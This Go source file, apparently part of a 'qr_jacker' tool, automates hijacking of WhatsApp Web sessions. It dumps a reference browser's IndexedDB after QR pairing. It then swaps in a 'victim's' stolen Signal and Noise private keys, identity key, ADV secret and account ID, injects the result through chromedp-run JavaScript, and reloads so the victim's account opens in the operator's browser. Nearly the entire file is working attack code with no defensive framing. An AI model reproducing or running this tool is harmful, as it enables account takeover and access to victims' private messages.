package whatsapp

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"
)

func sudoFixEnv() {
	if os.Getuid() != 0 {
		return
	}
	sudoUID := os.Getenv("SUDO_UID")
	if sudoUID == "" {
		return
	}
	// Running under sudo – env vars like XDG_RUNTIME_DIR and WAYLAND_DISPLAY
	// are stripped by sudo. Restore them so Chrome can find the Wayland socket.
	runtimeDir := fmt.Sprintf("/run/user/%s", sudoUID)
	if _, err := os.Stat(runtimeDir); err == nil {
		os.Setenv("XDG_RUNTIME_DIR", runtimeDir)
	}
	if os.Getenv("WAYLAND_DISPLAY") == "" {
		entries, err := os.ReadDir(runtimeDir)
		if err == nil {
			for _, e := range entries {
				if !e.IsDir() && strings.HasPrefix(e.Name(), "wayland-") {
					os.Setenv("WAYLAND_DISPLAY", e.Name())
					break
				}
			}
		}
	}
}

func startChrome(ctx context.Context, userDir string) (context.Context, context.CancelFunc, context.CancelFunc, error) {
	opts := []chromedp.ExecAllocatorOption{
		chromedp.NoSandbox,
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("ozone-platform", "wayland"),
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.UserDataDir(userDir),
		chromedp.WindowSize(1280, 900),
	}
	allocCtx, allocCancel := chromedp.NewExecAllocator(ctx, opts...)
	ctx2, cancel := chromedp.NewContext(allocCtx)
	return ctx2, cancel, allocCancel, nil
}

func DiscoverReferenceProfile(outDir string) error {
	os.Unsetenv("DISPLAY")
	sudoFixEnv()

	if err := os.MkdirAll(outDir, 0755); err != nil {
		return err
	}
	userDir, err := os.MkdirTemp("", "whatsapp-ref-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(userDir)

	ctx, cancel, allocCancel, err := startChrome(context.Background(), userDir)
	if err != nil {
		return err
	}
	defer cancel()
	defer allocCancel()

	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return err
	}

	fmt.Println("\n============================================")
	fmt.Println("  WHATSAPP WEB - REFERENCE PAIRING")
	fmt.Println("============================================")
	fmt.Println("  Chromium opened. Scan QR with your phone.")
	fmt.Println("============================================")

	// Wait for QR canvas to appear before dumping
	if err := chromedp.Run(ctx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
		return fmt.Errorf("wait QR: %w", err)
	}
	time.Sleep(2 * time.Second)
	dumpDB(ctx, filepath.Join(outDir, "pre_pairing.json"))

	fmt.Println("\n[*] Waiting for pairing (up to 2 min)...")
	pc, pcCancel := context.WithTimeout(ctx, 120*time.Second)
	defer pcCancel()
	if err := chromedp.Run(pc, chromedp.WaitNotPresent("canvas", chromedp.ByQuery)); err != nil {
		fmt.Println("[!] Timed out. Make sure you scanned the QR code.")
		return nil
	}
	time.Sleep(3 * time.Second)

	dumpDB(ctx, filepath.Join(outDir, "post_pairing.json"))
	fmt.Printf("\n[+] Saved to %s\n", outDir)
	return nil
}

const jsDump = `
(async () => {
  const dbs = await indexedDB.databases(), out = [];
  for (const info of dbs) {
    const db = await new Promise((res, rej) => { const r = indexedDB.open(info.name); r.onsuccess = e => res(e.target.result); r.onerror = e => rej(e.target.error); });
    const dbInfo = {name: info.name, version: info.version, stores: []};
    for (const sn of db.objectStoreNames) {
      const tx = db.transaction(sn, 'readonly'), st = tx.objectStore(sn);
      const values = await new Promise((res, rej) => { const r = st.getAll(); r.onsuccess = e => res(e.target.result); r.onerror = e => rej(e.target.error); });
      const keys   = await new Promise((res, rej) => { const r = st.getAllKeys(); r.onsuccess = e => res(e.target.result); r.onerror = e => rej(e.target.error); });
      const si = {name: sn, entries: []};
      for (let i = 0; i < values.length; i++) si.entries.push({k: keys[i], v: s(values[i])});
      dbInfo.stores.push(si);
    }
    out.push(dbInfo); db.close();
  }
  return JSON.stringify(out);
  function s(v) {
    if (v === null || v === undefined) return v;
    if (typeof v === 'number' || typeof v === 'string' || typeof v === 'boolean') return v;
    if (v instanceof ArrayBuffer) return {_b: Array.from(new Uint8Array(v))};
    if (ArrayBuffer.isView(v)) return {_b: Array.from(new Uint8Array(v.buffer, v.byteOffset, v.byteLength))};
    if (Array.isArray(v)) return v.map(s);
    const o = {};
    for (const k of Object.getOwnPropertyNames(v)) o[k] = s(v[k]);
    return o;
  }
})()`

func dumpDB(ctx context.Context, path string) {
	r, err := evalDump(ctx)
	if err != nil {
		fmt.Printf("  dump failed: %v\n", err); return
	}
	var v interface{}
	json.Unmarshal([]byte(r), &v)
	data, _ := json.MarshalIndent(v, "", "  ")
	os.WriteFile(path, data, 0644)
	fmt.Printf("  Saved: %s (%d bytes)\n", filepath.Base(path), len(data))
}

func evalDump(ctx context.Context) (string, error) {
	var r string
	if err := chromedp.Run(ctx, chromedp.Evaluate(jsDump, &r, func(p *runtime.EvaluateParams) *runtime.EvaluateParams {
		return p.WithAwaitPromise(true)
	})); err != nil {
		return "", err
	}
	return r, nil
}

func ReplayInBrowser(sd *sessionData) error {
	os.Unsetenv("DISPLAY")
	sudoFixEnv()

	// Load reference post-pairing template
	templateData, err := os.ReadFile("scripts/qr_jacker/whatsapp/reference/post_pairing.json")
	if err != nil {
		return fmt.Errorf("load reference template: %w", err)
	}

	var template interface{}
	if err := json.Unmarshal(templateData, &template); err != nil {
		return fmt.Errorf("parse reference template: %w", err)
	}

	// Replace crypto keys in the template with victim's keys
	replaceKeysInTemplate(template, sd)

	// Serialize modified template back to JSON
	modifiedTemplate, err := json.Marshal(template)
	if err != nil {
		return fmt.Errorf("serialize modified template: %w", err)
	}

	userDir, err := os.MkdirTemp("", "whatsapp-replay-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(userDir)

	ctx, cancel, allocCancel, err := startChrome(context.Background(), userDir)
	if err != nil {
		return err
	}
	defer cancel()
	defer allocCancel()

	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return err
	}
	if err := chromedp.Run(ctx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
		return fmt.Errorf("wait QR: %w", err)
	}
	time.Sleep(2 * time.Second)

	injectJS := genTemplateInjectJS(string(modifiedTemplate))

	var result string
	if err := chromedp.Run(ctx, chromedp.Evaluate(injectJS, &result, func(p *runtime.EvaluateParams) *runtime.EvaluateParams {
		return p.WithAwaitPromise(true)
	})); err != nil {
		return fmt.Errorf("inject: %w", err)
	}
	fmt.Printf("[+] %s\n", result)

	if err := chromedp.Run(ctx, chromedp.Reload()); err != nil {
		return err
	}
	fmt.Println("[+] WhatsApp Web opened. Press Enter to disconnect.")
	fmt.Scanln()
	return nil
}

func replaceKeysInTemplate(t interface{}, sd *sessionData) {
	dbs, ok := t.([]interface{})
	if !ok {
		return
	}
	advB64 := base64.StdEncoding.EncodeToString(sd.AdvSecretKey)

	for _, dbi := range dbs {
		db, ok := dbi.(map[string]interface{})
		if !ok {
			continue
		}
		stores, _ := db["stores"].([]interface{})

		for _, si := range stores {
			s, ok := si.(map[string]interface{})
			if !ok {
				continue
			}
			name, _ := s["name"].(string)
			entries, _ := s["entries"].([]interface{})

			switch name {
			case "signal-meta-store":
				for _, ei := range entries {
					e, ok := ei.(map[string]interface{})
					if !ok {
						continue
					}
					v, _ := e["v"].(map[string]interface{})
					if v == nil {
						continue
					}
					keyName, _ := v["key"].(string)
					switch keyName {
					case "signal_static_privkey":
						setNestedBytes(v, sd.NoisePriv, "value", "value")
					case "signal_static_pubkey":
						setNestedBytes(v, sd.NoisePub, "value", "value")
					case "signal_reg_id":
						v["value"] = float64(sd.RegistrationID)
					}
				}

			case "signed-prekey-store":
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					v, _ := e["v"].(map[string]interface{})
					if v == nil {
						continue
					}
					v["keyId"] = float64(sd.SignedPreKeyID)
					if kp, _ := v["keyPair"].(map[string]interface{}); kp != nil {
						kp["privKey"] = bytesToBJSON(sd.SignedPrePriv)
						kp["pubKey"] = bytesToBJSON(sd.SignedPrePub)
					}
					v["signature"] = bytesToBJSON(sd.SignedPreSig)
				}

			case "user-prefs":
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					v, _ := e["v"].(map[string]interface{})
					if v == nil {
						continue
					}
					if keyName, _ := v["key"].(string); keyName == "WAADVSecretKey" {
						v["value"] = advB64
					}
				}

			case "identity-store":
				// Add/replace own identity entry for the victim's JID
				ownJID := fmt.Sprintf("%s@lid.0", sd.JIDUser)
				found := false
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					if k, _ := e["k"].(string); k == ownJID {
						v, _ := e["v"].(map[string]interface{})
						if v != nil {
							v["identifier"] = ownJID
							// identityKey is stored as 33 bytes (0x05 prefix + 32-byte pub)
							ik := append([]byte{5}, sd.IdentityPub...)
							v["identityKey"] = bytesToBJSON(ik)
							found = true
						}
						break
					}
				}
				if !found {
					// Add new entry
					ik := append([]byte{5}, sd.IdentityPub...)
					entries = append(entries, map[string]interface{}{
						"k": ownJID,
						"v": map[string]interface{}{
							"identifier":   ownJID,
							"identityKey": bytesToBJSON(ik),
						},
					})
					s["entries"] = entries
				}

			case "session-store":
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					v, _ := e["v"].(map[string]interface{})
					if v == nil {
						continue
					}
					ownJID := fmt.Sprintf("%s@lid.0", sd.JIDUser)
					e["k"] = ownJID
					v["address"] = ownJID
				}

			case "device-list":
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					k, _ := e["k"].(string)
					// Replace keys that contain the reference JID with victim's JID
					if strings.Contains(k, "@lid") {
						parts := strings.SplitN(k, "@", 2)
						if len(parts) == 2 {
							e["k"] = fmt.Sprintf("%s@%s", sd.JIDUser, parts[1])
						}
					}
					// Replace JID-user inside value fields
					if v, _ := e["v"].(map[string]interface{}); v != nil {
						replaceJIDInValue(v, sd.JIDUser)
					}
				}
			}
		}
	}
}

func setNestedBytes(v map[string]interface{}, data []byte, keys ...string) {
	current := v
	for i, k := range keys {
		if i == len(keys)-1 {
			current[k] = bytesToBJSON(data)
			return
		}
		next, _ := current[k].(map[string]interface{})
		if next == nil {
			next = make(map[string]interface{})
			current[k] = next
		}
		current = next
	}
}

func bytesToBJSON(b []byte) map[string]interface{} {
	arr := make([]interface{}, len(b))
	for i, v := range b {
		arr[i] = float64(v)
	}
	return map[string]interface{}{"_b": arr}
}

func replaceJIDInValue(v map[string]interface{}, newJIDUser string) {
	refJIDUser := "256315209330757"
	for key, val := range v {
		if s, ok := val.(string); ok {
			if strings.Contains(s, refJIDUser) {
				v[key] = strings.ReplaceAll(s, refJIDUser, newJIDUser)
			}
		}
	}
}

func genTemplateInjectJS(templateJSON string) string {
	return fmt.Sprintf(`(async()=>{
const T=%s;
function m(v){
  if(v===null||v===undefined)return v;
  if(typeof v==='number'||typeof v==='string'||typeof v==='boolean')return v;
  if(Array.isArray(v))return v.map(m);
  if(v._b!==undefined&&Array.isArray(v._b))return new Uint8Array(v._b);
  const o={};
  for(const k of Object.getOwnPropertyNames(v))o[k]=m(v[k]);
  return o;
}
let r=0;
for(const dbInfo of T){
  const db=await new Promise((res,rej)=>{const r=indexedDB.open(dbInfo.name);r.onsuccess=e=>res(e.target.result);r.onerror=e=>rej(e.target.error)});
  for(const storeInfo of dbInfo.stores){
    const entries=storeInfo.entries;
    if(!entries||!entries.length)continue;
    const tx=db.transaction(storeInfo.name,'readwrite'),st=tx.objectStore(storeInfo.name);
    await new Promise((res,rej)=>{
      const c=st.clear();
      c.onsuccess=async()=>{
        for(const e of entries){
          try{
            const ev=m(e.v);
            await new Promise((r2,rj2)=>{const p=st.put(ev,e.k);p.onsuccess=()=>{r++;r2()};p.onerror=x=>rj2(x.target.error)});
          }catch(x){}
        }
        res();
      };
      c.onerror=e=>{rej(e.target.error)};
    });
  }
  db.close();
}
return "OK: "+r+" entries imported";
})()`, templateJSON)
}

func bjs(b []byte) string {
	if len(b) == 0 {
		return "[]"
	}
	s := "["
	for i, v := range b {
		if i > 0 {
			s += ","
		}
		s += fmt.Sprintf("%d", v)
	}
	return s + "]"
}
